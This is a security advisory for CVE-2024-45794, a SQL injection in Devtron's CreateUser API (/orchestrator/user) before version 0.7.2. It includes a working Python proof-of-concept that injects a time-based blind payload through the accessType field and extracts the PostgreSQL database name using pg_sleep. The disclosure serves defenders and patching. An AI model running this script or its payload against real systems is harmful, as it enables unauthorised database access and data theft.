# Devtron has SQL Injection in CreateUser API

**GHSA**: GHSA-q78v-cv36-8fxj | **CVE**: CVE-2024-45794 | **Severity**: high (CVSS 8.3)

**CWE**: CWE-89

**Affected Packages**:
- **github.com/devtron-labs/devtron** (go): < 0.7.2

## Description

### Summary
An authenticated user (with minimum permission) could utilize and exploit SQL Injection to allow the execution of malicious SQL queries via CreateUser API (/orchestrator/user).

### Details
The API is CreateUser (/orchestrator/user).

The function to read user input is:
https://github.com/devtron-labs/devtron/blob/4296366ae288f3a67f87e547d2b946acbcd2dd65/api/auth/user/UserRestHandler.go#L96-L104

The userInfo (line 104) parameter can be controlled by users.

The SQL injection can happen in the code:
https://github.com/devtron-labs/devtron/blob/4296366ae288f3a67f87e547d2b946acbcd2dd65/pkg/auth/user/repository/UserAuthRepository.go#L1038

The query (line 1038) parameter can be controlled by a user to create and execute a malicious SQL query.

The user should be authenticated but only needs minimum permissions:
![image](https://github.com/user-attachments/assets/08ba940e-33a8-408d-9a1e-9cd1504b95c5)


### PoC

Demonstrate a blind SQL injection to retrieve the database name:

```
import requests
import time
import string
import argparse

def blind(ip, token, query):
    url = f"http://{ip}/orchestrator/user"
    headers = {"token": token}
    entity = "chart-group"
    payload = f"'; {query} --"

    data = {"id": 111, "email_id": "abcd123@126.com", "superAdmin": False, "roleFilters":[{"team":"", "environment":"", "action": "", "entity": entity, "accessType": payload}]} #"EntityName": "test", "AccessType": "test", "Cluster": "",\"NameSpace": "devtroncd", "Group": "", "Kind": "", "Resource": "", "Workflow": ""
    start = time.time()
    res = requests.post(url, headers=headers, json = data)
    end = time.time()
    #print(res.content)
    if(end - start > 1):
        return True
    return False

def main(ip, token):
    chs = string.printable
    result = ""
    is_end = False
    i = 1
    while(not is_end):
        is_end = True
        for ch in chs:
            if(blind(ip, token, f"select case when substring(datname,{i},1)='{ch}' then pg_sleep(1) else pg_sleep(0) end from pg_database limit 1;")):
                print(ch)
                result += ch
                is_end = False
                break
        i += 1
    print(result)

if __name__ == "__main__":
    argparser = argparse.ArgumentParser()
    argparser.add_argument("--ip", "-i", type=str, help="Target IP")
    argparser.add_argument("--token", "-t", type=str, help="API TOKEN")
    args = argparser.parse_args()
    main(args.ip, args.token)
```

The debugging breakpoint indicated that the malicious SQL query was executed:
![image](https://github.com/user-attachments/assets/c9067360-8fb3-4d64-82e9-3af1e5e60969)

We can see that we can get the database name:
![image](https://github.com/user-attachments/assets/29d5d969-876a-452d-be7f-8984d2a28c25)


### Impact
SQL injection vulnerability. Our tests indicate that the latest version is affected.

The reporters are Yuan Luo, Shuai Xiong from Tencent YunDing Security Lab.

